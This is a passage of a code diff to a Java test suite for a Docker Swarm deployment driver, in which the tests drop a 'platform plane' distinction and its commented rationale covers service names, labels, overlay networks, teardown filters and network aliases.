@@ -14,7 +14,6 @@ import eu.wohlben.qits.platform.deployments.deployments.control.ExtrasSnapshot;
 import eu.wohlben.qits.platform.deployments.deployments.control.HealthGate;
 import eu.wohlben.qits.platform.deployments.deployments.control.PdProcess;
 import eu.wohlben.qits.platform.deployments.deployments.control.ServiceExtras;
-import eu.wohlben.qits.platform.deployments.environments.entity.PdDeploymentTarget;
 import eu.wohlben.qits.platform.deployments.environments.error.BadRequestException;
 import io.smallrye.config.PropertiesConfigSource;
 import io.smallrye.config.SmallRyeConfigBuilder;
@@ -125,32 +124,36 @@ class SwarmDeploymentDriverTest {
   }
 
   /**
-   * An ordinary tier application, asked for the docker-shaped membership the state machine computes
-   * without knowing who runs it: its own network first, then the legacy one and its bundle.
+   * An application, asked for the docker-shaped membership the state machine computes without
+   * knowing who runs it: its own network first, then the legacy one and its bundle.
+   *
+   * <p><b>There is one shape here now, and that is the whole of what the plane's deletion did to
+   * this fixture.</b> Every overload used to take a {@code PdDeploymentTarget} and branch on it,
+   * because a PLATFORM service was a second shape — a bare deployment name, a bare wire alias, and
+   * the {@code qits-platform} overlay beside the flat one. The enum is deleted, and with it the
+   * question: every service is an environment service in the one tier, so the fixture always
+   * produces what the {@code platform == false} arm used to produce and nothing branches on
+   * anything.
    */
   private DeploymentDriver.ServiceSpec spec() {
-    return spec(PdDeploymentTarget.ENVIRONMENT, DeploymentDriver.UpdateOrder.START_FIRST, List.of());
+    return spec(DeploymentDriver.UpdateOrder.START_FIRST, List.of());
   }
 
   private DeploymentDriver.ServiceSpec spec(
-      PdDeploymentTarget target,
-      DeploymentDriver.UpdateOrder order,
-      List<DeploymentDriver.ResourceBinding> resources) {
-    return spec(target, order, DeploymentDriver.PublishMode.HOST, resources);
+      DeploymentDriver.UpdateOrder order, List<DeploymentDriver.ResourceBinding> resources) {
+    return spec(order, DeploymentDriver.PublishMode.HOST, resources);
   }
 
   private DeploymentDriver.ServiceSpec spec(
-      PdDeploymentTarget target,
       DeploymentDriver.UpdateOrder order,
       DeploymentDriver.PublishMode publishMode,
       List<DeploymentDriver.ResourceBinding> resources) {
-    return spec(target, order, publishMode, resources, List.of());
+    return spec(order, publishMode, resources, List.of());
   }
 
   /** The same application, having declared volumes of its own in its {@code deployments.yml}. */
   private DeploymentDriver.ServiceSpec spec(List<DeploymentDriver.VolumeMount> volumes) {
     return spec(
-        PdDeploymentTarget.ENVIRONMENT,
         DeploymentDriver.UpdateOrder.START_FIRST,
         DeploymentDriver.PublishMode.HOST,
         List.of(),
@@ -158,15 +161,15 @@ class SwarmDeploymentDriverTest {
   }
 
   private DeploymentDriver.ServiceSpec spec(
-      PdDeploymentTarget target,
       DeploymentDriver.UpdateOrder order,
       DeploymentDriver.PublishMode publishMode,
       List<DeploymentDriver.ResourceBinding> resources,
       List<DeploymentDriver.VolumeMount> volumes) {
-    boolean platform = target == PdDeploymentTarget.PLATFORM;
-    // BOTH PLANES CARRY THE TIER. A platform service is deployed into the designated environment,
-    // so its spec names one exactly as an environment application's does; what stays the plane's
-    // own is the bare deployment name, the bare wire alias and the qits-platform overlay below.
+    // EVERY SERVICE CARRIES THE TIER, and now nothing carries anything else. A platform service was
+    // already deployed into the designated environment, so its spec named a tier exactly as this
+    // one does; what was the plane's own — the unqualified `qits-pd-<app>-<id8>` deployment name,
+    // the bare `<app>` wire alias and the `qits-platform` overlay — is simply gone, because there
+    // is no plane to be the exception.
     return new DeploymentDriver.ServiceSpec(
         "env-id",
         "dev",
@@ -178,16 +181,13 @@ class SwarmDeploymentDriverTest {
         // The ordinary release: its tag carried a declaration, so the store holds one for this
         // version and the extras read is addressed by it. The undeclared arm is a test of its own.
         true,
-        platform ? "qits-pd-qits-gateway-dep" : "qits-pd-dev-qits-gateway-dep",
-        platform ? "qits-gateway" : "dev-qits-gateway",
-        platform
-            ? List.of("qits-platform", "qits-net")
-            : List.of("qits-env-dev-qits-gateway", "qits-net", "qits-env-dev"),
+        "qits-pd-dev-qits-gateway-dep",
+        "dev-qits-gateway",
+        List.of("qits-env-dev-qits-gateway", "qits-net", "qits-env-dev"),
         IMAGE,
         "/q/health/ready",
         null,
-        target,
-        !platform,
+        true,
         order,
         publishMode,
         resources,
@@ -198,16 +198,15 @@ class SwarmDeploymentDriverTest {
   void theServiceIsNamedAfterTheWireAliasBecauseTheNameIsTheAddress() {
     // container_name does not exist under swarm, so the service name IS what peers resolve — and
     // therefore what the deployment row records and every later question asks about.
+    //
+    // There was a second assertion here and it was the plane's: a PLATFORM spec answered with the
+    // bare `qits-gateway`, because one instance served every tier and a consumer had to be able to
+    // reach it without knowing which tier it ran in. The plane is deleted, so there is no second
+    // answer to assert — `nameOf` is the wire alias and the wire alias is `<env>-<app>`, always.
+    // The nine services that were the plane are being renamed `qits-ci` -> `dev-qits-ci` for
+    // exactly this reason, and the qualified name was granted as an extra alias one release earlier
+    // so no peer would be left dialling a name nothing answers to while that happened.
     assertEquals("dev-qits-gateway", driver().nameOf(spec()));
-    assertEquals(
-        "qits-gateway",
-        driver()
-            .nameOf(
-                spec(
-                    PdDeploymentTarget.PLATFORM,
-                    DeploymentDriver.UpdateOrder.START_FIRST,
-                    List.of())),
-        "one instance for the whole platform keeps the bare name");
   }
 
   @Test
@@ -239,7 +238,13 @@ class SwarmDeploymentDriverTest {
     assertTrue(argv.contains("qits.platform.deployments.environment=env-id"));
     assertTrue(argv.contains("qits.platform.deployments.application=app-id"));
     assertTrue(argv.contains("qits.platform.deployments.deployment=dep-id"));
-    assertTrue(argv.contains("qits.platform.deployments.target=environment"));
+    // There were six labels and there are five: `qits.platform.deployments.target` said which plane
+    // a service was on, and a question with one answer is not worth a label. Its absence is
+    // asserted rather than merely unasserted, because a label nothing writes but something still
+    // FILTERS on is a teardown that reaps nothing — see the teardown test below.
+    assertTrue(
+        argv.stream().noneMatch(argument -> argument.startsWith("qits.platform.deployments.target")),
+        "the plane is deleted, so nothing labels a service with one: " + argv);
     assertTrue(argv.contains("qits.platform.deployments.app-name=qits-gateway"));
     assertEquals(
         argv.stream().filter("--label"::equals).count(),
@@ -257,51 +262,66 @@ class SwarmDeploymentDriverTest {
   }
 
   @Test
-  void theTopologyCollapsesToTheFlatOverlayAndTheDeclaredSetIsWhatTheServiceGets() {
+  void theTopologyCollapsesToTheFlatOverlayAloneAndTheDeclaredSetIsWhatTheServiceGets() {
     // §4.1: every `service update --network-add` recreates the task, so a per-application network
     // per deployment would make one deployment a restart storm. What survives is the flat
-    // attachable overlay — and qits-platform for the plane that needs it.
+    // attachable overlay.
+    //
+    // IT USED TO BE TWO OVERLAYS AND IT IS ONE. The second half of this test asserted that a
+    // PLATFORM spec collapsed to `qits-net` AND `qits-platform` — the overlay that belonged to no
+    // environment, which was the swarm spelling of "on every environment's networks". The plane is
+    // deleted, so there is nothing for a second overlay to mean: every service is an environment
+    // service in the one tier and joins the one network every service joins. The claim that
+    // replaced it is the absence, asserted rather than left implicit, because a network the driver
+    // still declared and nothing ever created would be a `service create` that fails outright.
     SwarmDeploymentDriver driver = driver();
     cli.script("--format {{.ID}}", result(1, "no such service"));
 
     driver.apply(spec());
 
     List<String> create = cli.matching("service create");
-    assertTrue(create.containsAll(List.of("--network", "qits-net")), create.toString());
+    assertEquals(
+        List.of("--network", "qits-net"),
+        networkArguments(create),
+        "the flat overlay alone, and nothing else is declared: " + create);
     assertTrue(
         create.stream().noneMatch(argument -> argument.startsWith("qits-env-")),
         "no per-application or bundle network is declared: " + create);
-
-    SwarmDeploymentDriver platform = driver();
-    cli.script("--format {{.ID}}", result(1, "no such service"));
-    platform.apply(
-        spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
-    List<String> platformCreate = cli.matching("service create");
-    // The MEMBERSHIP is what this test is about and it is unchanged — both overlays, neither
-    // dropped. The flat one is spelled as an attachment rather than as a bare name because a
-    // platform service now carries the tier-qualified alias there beside its bare service name; see
-    // `aPlatformServiceAnswersToItsBareNameANDToTheTierQualifiedOne`. The network itself is the same
-    // network, which is why this asserts membership rather than the spelling.
-    assertTrue(platformCreate.contains("name=qits-net,alias=dev-qits-gateway"), platformCreate.toString());
-    assertTrue(platformCreate.contains("qits-platform"), platformCreate.toString());
+    // Equality rather than a substring, deliberately: the image coordinate is served from
+    // qits-platform-artifacts, so a `contains` here would match the last token of every create argv
+    // and the assertion would be red for a reason that is not the plane.
+    assertTrue(
+        create.stream().noneMatch("qits-platform"::equals),
+        "the plane's own overlay is not declared by anybody any more: " + create);
+    assertTrue(
+        cli.calls.stream()
+            .noneMatch(argv -> String.join(" ", argv).contains("network create qits-platform")),
+        "and nothing goes looking to create it either: " + cli.calls);
   }
 
   @Test
-  void aPlatformServiceCarriesTheTierInItsLabelsAndItsEnvironmentAndNothingInItsNames() {
-    // The whole of what V8 changed at the argv, in one place.
+  void everyServiceCarriesTheTierInItsLabelsItsEnvironmentAndItsNameAndNoPlaneAnywhere() {
+    // The whole of what the plane's deletion changed at the argv, in one place.
     //
-    // A platform service used to be created with NO environment label and NO QITS_ENVIRONMENT, on
-    // the reasoning that it serves every tier and being told it lived in one would be untrue. What
-    // that actually bought was an application that could not name its own install: no tier in its
-    // telemetry, no tier on the four events consumers project a route table per environment from,
-    // and a resource registry keyed by an absence. It is deployed into the designated tier and says
-    // so.
+    // The claim this replaces was `aPlatformServiceCarriesTheTierInItsLabelsAndItsEnvironmentAndNothingInItsNames`,
+    // and it held three things at once: that a platform service DID carry the environment label and
+    // QITS_ENVIRONMENT (V8's correction of an older design where it carried neither, which cost the
+    // plane the ability to name its own install — no tier in its telemetry, no tier on the four
+    // events a route table per environment is projected from, a resource registry keyed by an
+    // absence); that it ALSO carried `qits.platform.deployments.target=platform`, which was what a
+    // reader asked instead of "has no tier"; and that nothing about its NAMES was qualified by the
+    // tier, because one instance served every tier and a consumer had to reach it without knowing
+    // which one it ran in.
+    //
+    // Two of those three stopped being true, for one reason: there is no plane. The tier half
+    // survives unchanged and is asserted here for EVERY service rather than as a platform
+    // exception. The target label is gone, because a plane with one value is not a fact worth
+    // labelling. And the names ARE tier-qualified now — a swarm service's name IS its address, and
+    // the nine services that were the plane are being renamed `qits-ci` -> `dev-qits-ci`, which is
+    // why the qualified name was granted as an extra network alias one release earlier: a dialer
+    // could move onto it while the bare name went on answering.
     List<String> argv =
-        driver()
-            .buildCreateArgv(
-                spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()),
-                "qits-gateway",
-                List.of("qits-net", "qits-platform"));
+        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));
 
     assertTrue(argv.contains("qits.platform.deployments.environment=env-id"), argv.toString());
     assertTrue(argv.contains("QITS_ENVIRONMENT=dev"), argv.toString());
@@ -309,24 +329,31 @@ class SwarmDeploymentDriverTest {
         argv.contains(
             "OTEL_RESOURCE_ATTRIBUTES=service.version=abc1234"
                 + ",deployment.environment.name=dev"
-                + ",service.instance.id=qits-gateway"),
-        "the telemetry names the tier AND the bare instance: " + argv);
-    // ...and the plane is still stated, which is what every reader asks instead of "has no tier".
-    assertTrue(argv.contains("qits.platform.deployments.target=platform"), argv.toString());
-    // The three things that stay the plane's own, none of them derived from a missing tier.
-    assertTrue(argv.containsAll(List.of("--name", "qits-gateway")), argv.toString());
-    assertTrue(argv.containsAll(List.of("--network", "qits-platform")), argv.toString());
+                + ",service.instance.id=dev-qits-gateway"),
+        "the telemetry names the tier AND the tier-qualified instance: " + argv);
+    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")), argv.toString());
+    // The absence, stated: no `target=` label at all, in either spelling it ever had.
     assertTrue(
-        argv.stream().noneMatch("dev-qits-gateway"::equals),
-        "nothing about a platform service is qualified by the tier: " + argv);
+        argv.stream().noneMatch(argument -> argument.startsWith("qits.platform.deployments.target")),
+        "no service is labelled with a plane, because there is no plane: " + argv);
   }
 
   @Test
-  void anEnvironmentTeardownReapsThatTiersServicesAndNotThePlaneRunningInIt() {
-    // The reader the label change had to move with it. A teardown reaps by the environment label,
-    // and a platform service carries this tier's now — so without the second filter, tearing down
-    // the designated environment would take qits-platform-idp, the deployer and the rest of the
-    // plane with it. They serve every tier and are merely running in this one.
+  void anEnvironmentTeardownReapsByTheEnvironmentLabelAndNothingElse() {
+    // The reader that moved with the label, twice.
+    //
+    // It used to demand `qits.platform.deployments.target=environment` beside the environment id,
+    // and the second filter was load-bearing for exactly as long as the plane existed: a platform
+    // service carried a tier's environment label while serving every tier, so tearing down the
+    // designated environment would have taken qits-platform-idp, the deployer and the rest of the
+    // plane down with it. That is why the test was called
+    // `anEnvironmentTeardownReapsThatTiersServicesAndNotThePlaneRunningInIt`.
+    //
+    // There is no service that serves a tier it does not belong to any more, so the environment
+    // label is the whole question again — and the target label is not merely unnecessary, it is
+    // UNWRITTEN (see the create argv above), which is what makes the second filter dangerous rather
+    // than redundant: a filter on a label nothing emits matches nothing, and a teardown that
+    // silently reaps zero services is an environment that never goes away.
     SwarmDeploymentDriver driver = driver();
     cli.script("service ls", result(0, ""));
 
@@ -335,9 +362,13 @@ class SwarmDeploymentDriverTest {
     List<String> listed = cli.matching("service ls");
     assertTrue(
         listed.contains("label=qits.platform.deployments.environment=env-id"), listed.toString());
+    assertEquals(
+        1,
+        listed.stream().filter("--filter"::equals).count(),
+        "one filter, and it is the environment's: " + listed);
     assertTrue(
-        listed.contains("label=qits.platform.deployments.target=environment"),
-        "the plane is excluded by the label it now carries: " + listed);
+        listed.stream().noneMatch(argument -> argument.contains("deployments.target")),
+        "nothing filters on a plane that no service is labelled with: " + listed);
   }
 
   /** Every {@code --network} and the element behind it, in order — the membership as declared. */
@@ -356,7 +387,16 @@ class SwarmDeploymentDriverTest {
   void aDeclaredAliasRidesTheSharedNetworksAttachmentAndNoOthers() {
     // The edge carries the platform's vhost names, and docker's embedded DNS cannot synthesize a
     // *.localhost — so those names resolve only as aliases of the edge's attachment to the network
-    // every service joins. qits-platform is the plane's own network and keeps the short form.
+    // every service joins. Any OTHER network in the membership keeps the short form, because an
+    // alias is an address and the address has to live where the platform's names are resolved.
+    //
+    // The second network used to be spelled `qits-platform` here, and it cannot be any more: that
+    // overlay was the plane's own and went with the plane. `qits-env-dev` stands in its place — the
+    // bundle overlay the state machine still computes and the spec still declares, and which
+    // `collapse` drops before a real deployment ever reaches this method. That is not a cheat: this
+    // test drives buildCreateArgv directly with a membership of its own precisely so the "only the
+    // shared network carries aliases" rule is pinned as a rule rather than as an accident of there
+    // happening to be one network left to attach to.
     SwarmDeploymentDriver driver =
         driver(
             Map.of(
@@ -366,14 +406,14 @@ class SwarmDeploymentDriverTest {
                     "mirror.dev.localhost"));
 
     List<String> argv =
-        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-platform"));
+        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));
 
     assertTrue(
         argv.containsAll(
             List.of(
                 "--network", "name=qits-net,alias=registry.dev.localhost,alias=mirror.dev.localhost")),
         argv.toString());
-    assertTrue(argv.containsAll(List.of("--network", "qits-platform")), argv.toString());
+    assertTrue(argv.containsAll(List.of("--network", "qits-env-dev")), argv.toString());
     assertEquals(2, argv.stream().filter("--network"::equals).count(), argv.toString());
     assertEquals(IMAGE, argv.get(argv.size() - 1));
   }
@@ -383,95 +423,105 @@ class SwarmDeploymentDriverTest {
     // The pin: `--network <net>` and `--network name=<net>` mean the same thing to swarm, and only
     // one of them is what every service on this platform was created with.
     List<String> argv =
-        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-platform"));
+        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));
 
     assertEquals(
-        List.of("--network", "qits-net", "--network", "qits-platform"),
+        List.of("--network", "qits-net", "--network", "qits-env-dev"),
         networkArguments(argv),
         argv.toString());
     assertTrue(argv.stream().noneMatch(argument -> argument.startsWith("name=")), argv.toString());
   }
 
   @Test
-  void aPlatformServiceAnswersToItsBareNameANDToTheTierQualifiedOne() {
-    // The additive half of the staged cutover. The plane is being removed and every service becomes
-    // an ordinary environment service addressed <env>-<app> — but a swarm service's NAME is its
-    // address and swarm cannot rename one, so flipping the derivation in a single change would
-    // create dev-qits-gateway BESIDE the qits-gateway that was serving and leave every peer dialling
-    // a name nothing answers to. So the qualified name starts answering FIRST, as an alias, while
-    // the bare name goes on working: dialers move one at a time, and the plane is deleted later.
+  void theTierQualifiedNameIsTheServicesOwnNameNowSoNothingDerivesAnAliasFromIt() {
+    // This test was `aPlatformServiceAnswersToItsBareNameANDToTheTierQualifiedOne`, and it held the
+    // ADDITIVE first half of the plane's deletion: a platform service kept its bare `qits-gateway`
+    // name and was granted `dev-qits-gateway` as an extra alias on the shared network, so that a
+    // dialer could move onto the qualified name one at a time while the bare one went on answering.
+    // That staging existed because a swarm service's NAME is its address and swarm cannot rename
+    // one — flipping the derivation in a single change would have created dev-qits-gateway BESIDE
+    // the qits-gateway that was serving and left every peer dialling a name nothing answers to.
+    //
+    // The plane is deleted and that cutover is finished: the qualified name is the service's own
+    // NAME. So the derivation that used to produce an extra alias could only ever produce an alias
+    // equal to the name — which is a line swarm has no use for — and `aliasesOf` therefore answers
+    // with deployment config's list and nothing else. An application that declares none gets the
+    // byte-identical SHORT form, which is what this now pins.
     List<String> argv =
-        driver()
-            .buildCreateArgv(
-                spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()),
-                "qits-gateway",
-                List.of("qits-net", "qits-platform"));
+        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));
 
-    // The NAME is untouched — this change renames nothing, and the bare address is what holds.
-    assertTrue(argv.containsAll(List.of("--name", "qits-gateway")), argv.toString());
+    assertTrue(argv.containsAll(List.of("--name", "dev-qits-gateway")), argv.toString());
     assertEquals(
-        List.of("--network", "name=qits-net,alias=dev-qits-gateway", "--network", "qits-platform"),
+        List.of("--network", "qits-net"),
         networkArguments(argv),
-        argv.toString());
+        "no name=...,alias=... attachment, because there is nothing left to derive: " + argv);
   }
 
   @Test
-  void aPlatformServicesDerivedAliasComesAFTERTheOnesConfigDeclared() {
-    // Config's own aliases keep the order and the position they always had, so the derived one is
-    // an addition to that list rather than a reshuffle of it.
+  void configDeclaredAliasesAreTheWholeOfWhatIsEmittedAndInConfigsOwnOrder() {
+    // This was `aPlatformServicesDerivedAliasComesAFTERTheOnesConfigDeclared`, and what it pinned
+    // was a POSITION: config's own aliases kept the order and the place they always had, and the
+    // derived tier-qualified one was appended after them rather than reshuffling the list. There is
+    // no derived alias any more — the qualified name is the service's name — so the position claim
+    // has nothing to be about, and what survives is the stronger statement underneath it: what a
+    // service answers to beyond its own name is deployment config's declaration, all of it, in the
+    // order config declared it, and nothing else joins the list.
     SwarmDeploymentDriver driver =
         driver(
             Map.of(
                 DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
-                "registry.dev.localhost"));
+                    "registry.dev.localhost",
+                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[1]",
+                    "mirror.dev.localhost"));
 
     List<String> argv =
-        driver.buildCreateArgv(
-            spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()),
-            "qits-gateway",
-            List.of("qits-net", "qits-platform"));
+        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net"));
 
     assertEquals(
-        List.of(
-            "--network",
-            "name=qits-net,alias=registry.dev.localhost,alias=dev-qits-gateway",
-            "--network",
-            "qits-platform"),
+        List.of("--network", "name=qits-net,alias=registry.dev.localhost,alias=mirror.dev.localhost"),
+        networkArguments(argv),
+        "config's two, in config's order, and no third: " + argv);
+  }
+
+  @Test
+  void aServiceThatDeclaresNoAliasInConfigEmitsNoAliasAtAll() {
+    // The absence, asserted across the whole argv rather than only at the attachment — this was
+    // `anEnvironmentServiceGainsNothingBecauseTheQualifiedNameIsAlreadyItsOwn`, and the reasoning
+    // it carried is now the universal one rather than the environment plane's half of a pair: a
+    // service is NAMED dev-qits-gateway, so an alias derived from the tier and the application
+    // would be the name it already holds, and swarm has no use for that line. Nothing derives one,
+    // so nothing anywhere in the argv says `alias=`.
+    List<String> argv =
+        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-env-dev"));
+
+    assertTrue(
+        argv.stream().noneMatch(argument -> argument.contains("alias=")), argv.toString());
+    assertEquals(
+        List.of("--network", "qits-net", "--network", "qits-env-dev"),
         networkArguments(argv),
         argv.toString());
   }
 
   @Test
-  void anEnvironmentServiceGainsNothingBecauseTheQualifiedNameIsAlreadyItsOwn() {
-    // The other half of the claim, and the one that keeps this change additive: a tier's service is
-    // NAMED dev-qits-gateway, so the alias it would be given is the name it already holds — and an
-    // alias equal to a service's own name is a line swarm has no use for. Byte for byte the short
-    // form, which is what `aServiceWithNoAliasesGetsTheShortFormItAlwaysGot` pins for everyone else.
-    List<String> argv =
-        driver().buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-net", "qits-platform"));
-
-    assertEquals(
-        List.of("--network", "qits-net", "--network", "qits-platform"),
-        networkArguments(argv),
-        argv.toString());
-  }
-
-  @Test
-  void aPlatformServiceWithNoSharedNetworkIsDEPLOYEDRatherThanRefused() {
-    // The derived alias is nobody's request — the bare name already covers it — so with no shared
-    // network to hold it, it is dropped. A DECLARED alias in the same position is still a refusal
-    // (the test below), and that asymmetry is the point: this change must not be able to turn a
-    // platform deployment that works today into one that fails.
+  void anApplicationThatDeclaresNoAliasAndHasNoSharedNetworkIsDEPLOYEDRatherThanRefused() {
+    // This was `aPlatformServiceWithNoSharedNetworkIsDEPLOYEDRatherThanRefused`, and the asymmetry
+    // it protected was between a DERIVED alias and a DECLARED one: the derived tier-qualified name
+    // was nobody's request — the bare service name already covered it — so with no shared network
+    // to hold it, it was dropped rather than refused, and a change meant to be additive could not
+    // turn a working platform deployment into a failing one.
+    //
+    // The derived alias does not exist any more, so that exact asymmetry is unexpressible. The
+    // claim that survives is the half that was always the real one: an application declaring NO
+    // aliases has nothing that needs a shared network, so an install without one deploys it. The
+    // refusal is still the answer for a DECLARED alias with nowhere to live, and the neighbouring
+    // `aliasesWithNoSharedNetworkToHoldThemRefuseTheDeployment` is what keeps holding that.
     SwarmDeploymentDriver driver = driver();
     driver.flatNetwork = "";
 
     List<String> argv =
-        driver.buildCreateArgv(
-            spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()),
-            "qits-gateway",
-            List.of("qits-platform"));
+        driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-env-dev"));
 
-    assertEquals(List.of("--network", "qits-platform"), networkArguments(argv), argv.toString());
+    assertEquals(List.of("--network", "qits-env-dev"), networkArguments(argv), argv.toString());
   }
 
   @Test
@@ -487,7 +537,7 @@ class SwarmDeploymentDriverTest {
 
     assertThrows(
         ServiceExtras.Refused.class,
-        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-platform")));
+        () -> driver.buildCreateArgv(spec(), "dev-qits-gateway", List.of("qits-env-dev")));
   }
 
   @Test
@@ -714,45 +764,56 @@ class SwarmDeploymentDriverTest {
 
   @Test
   void aDeclaredAliasMissingFromTheLiveServiceIsRemovedAndCreatedAgain() {
-    // THE LEVER THAT MAKES THE ALIAS REACH THE FLEET. buildUpdateArgv states no networks, an
-    // attachment is restated whole or not at all, and swarm has no add-an-alias — so the
-    // environment-qualified alias a platform service now declares reaches a service that is ALREADY
-    // RUNNING by exactly one route. Measured on the estate before this landed: qits-platform-idp
-    // resolved and dev-qits-platform-idp did not, after two deployments carrying the declaration.
-    // Nothing may move to dialling the qualified name until this arm exists.
-    SwarmDeploymentDriver driver = driver();
-    cli.script("--format {{.ID}} qits-gateway", result(0, "svc123"));
-    cli.script("--format {{.ID}} qits_qits-gateway", result(1, "no such service"));
+    // THE LEVER THAT MAKES A DECLARED ALIAS REACH THE FLEET. buildUpdateArgv states no networks, an
+    // attachment is restated whole or not at all, and swarm has no add-an-alias — so an alias
+    // reaches a service that is ALREADY RUNNING by exactly one route: a `service rm` and a create.
+    //
+    // What drove the arm here used to be the DERIVED alias — the environment-qualified name a
+    // platform service was granted beside its bare one. Measured on the estate before it landed:
+    // qits-platform-idp resolved and dev-qits-platform-idp did not, after two deployments carrying
+    // the declaration. That derivation is gone with the plane (the qualified name is the service's
+    // own name now), so the arm is exercised where it still has work to do: an alias deployment
+    // config DECLARES. The mechanism is the one thing that did not change, and it must not rot just
+    // because its first customer was retired.
+    SwarmDeploymentDriver driver =
+        driver(
+            Map.of(
+                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
+                "registry.dev.localhost"));
+    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
+    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
     cli.script("TaskTemplate.Networks", result(0, ""));
 
-    DeploymentDriver.ApplyResult applied =
-        driver.apply(
-            spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
+    DeploymentDriver.ApplyResult applied = driver.apply(spec());
 
     assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
     assertTrue(cli.matching("service update").isEmpty(), "an update could never carry the alias");
-    assertEquals(List.of("docker", "service", "rm", "qits-gateway"), cli.matching("service rm"));
+    assertEquals(List.of("docker", "service", "rm", "dev-qits-gateway"), cli.matching("service rm"));
     List<String> created = cli.matching("service create");
-    // The NAME is untouched — the bare address goes on answering — and the qualified one is created
-    // beside it, which is the whole of what slice B declared and this makes live.
-    assertTrue(created.containsAll(List.of("--name", "qits-gateway")), created.toString());
-    assertTrue(created.contains("name=qits-net,alias=dev-qits-gateway"), created.toString());
+    // The NAME is the wire alias and is untouched by any of this; what the recreate is FOR is the
+    // attachment, which is the one thing a `service update` can never restate.
+    assertTrue(created.containsAll(List.of("--name", "dev-qits-gateway")), created.toString());
+    assertTrue(created.contains("name=qits-net,alias=registry.dev.localhost"), created.toString());
     assertTrue(cli.count("ps --quiet") > 0, "the task is waited out before the successor starts");
   }
 
   @Test
   void aDeclaredAliasTheLiveServiceAlreadyAnswersToIsAnOrdinaryUpdate() {
-    // What every platform service settles into after its one recreate: the declaration and the live
-    // attachment say the same thing, and a deployment is a deployment. This is what stops the arm
-    // above from recreating the same service on every deployment forever.
-    SwarmDeploymentDriver driver = driver();
-    cli.script("--format {{.ID}} qits-gateway", result(0, "svc123"));
-    cli.script("--format {{.ID}} qits_qits-gateway", result(1, "no such service"));
-    cli.script("TaskTemplate.Networks", result(0, "dev-qits-gateway\n"));
+    // What a service settles into after its one recreate: the declaration and the live attachment
+    // say the same thing, and a deployment is a deployment. This is what stops the arm above from
+    // recreating the same service on every deployment forever. It read the derived platform alias
+    // before the plane was deleted and reads a config-declared one now — the same claim about the
+    // same comparison, off the only kind of alias that still exists.
+    SwarmDeploymentDriver driver =
+        driver(
+            Map.of(
+                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
+                "registry.dev.localhost"));
+    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
+    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
+    cli.script("TaskTemplate.Networks", result(0, "registry.dev.localhost\n"));
 
-    DeploymentDriver.ApplyResult applied =
-        driver.apply(
-            spec(PdDeploymentTarget.PLATFORM, DeploymentDriver.UpdateOrder.START_FIRST, List.of()));
+    DeploymentDriver.ApplyResult applied = driver.apply(spec());
 
     assertEquals(DeploymentDriver.ApplyOutcome.APPLIED, applied.outcome());
     assertTrue(cli.matching("service rm").isEmpty(), "it recreates once, not every time");
@@ -787,9 +848,12 @@ class SwarmDeploymentDriverTest {
 
   @Test
   void anApplicationThatDeclaresNoAliasIsNotEvenAskedAboutThem() {
-    // The other half of the estate protection, and it is what keeps this free: an environment
-    // service derives no alias and declares none in config, so the whole question costs no CLI call
-    // at all — the shape missingDeclaredVolume takes for the services that declare no volume.
+    // The other half of the estate protection, and it is what keeps this free: nothing derives an
+    // alias for any service any more, so an application that declares none in config asks the whole
+    // question for no CLI call at all — the shape missingDeclaredVolume takes for the services that
+    // declare no volume. It was already true of an environment service before the plane was
+    // deleted; it is true of every service now, which is why this is the ordinary case and not a
+    // plane's exemption.
     SwarmDeploymentDriver driver = driver();
     cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
     cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
@@ -806,13 +870,22 @@ class SwarmDeploymentDriverTest {
     // The volume arm's stance, for the same reason: this risks destroying a running service over a
     // CLI call that failed, where carrying the alias one deployment longer risks nothing at all.
     // The next deployment asks again.
-    SwarmDeploymentDriver driver = driver();
-    cli.script("--format {{.ID}} qits-gateway", result(0, "svc123"));
-    cli.script("--format {{.ID}} qits_qits-gateway", result(1, "no such service"));
+    //
+    // It used to stage the case with a PLATFORM spec, because the derived tier-qualified alias was
+    // the only alias a fixture needed no config for. With the plane deleted there is no derived
+    // alias, and a service that declares none is never asked about them at all — so the inspect
+    // this test is about would never be issued and the assertions would pass saying nothing. The
+    // alias is declared in config, which is what puts a real inspect on the wire to fail.
+    SwarmDeploymentDriver driver =
+        driver(
+            Map.of(
+                DeploymentDriver.EXTRAS_PREFIX + "qits-gateway.aliases[0]",
+                "registry.dev.localhost"));
+    cli.script("--format {{.ID}} dev-qits-gateway", result(0, "svc123"));
+    cli.script("--format {{.ID}} qits_dev-qits-gateway", result(1, "no such service"));
     cli.script("TaskTemplate.Networks", result(1, "Error: No such service"));
 
-    driver.apply(
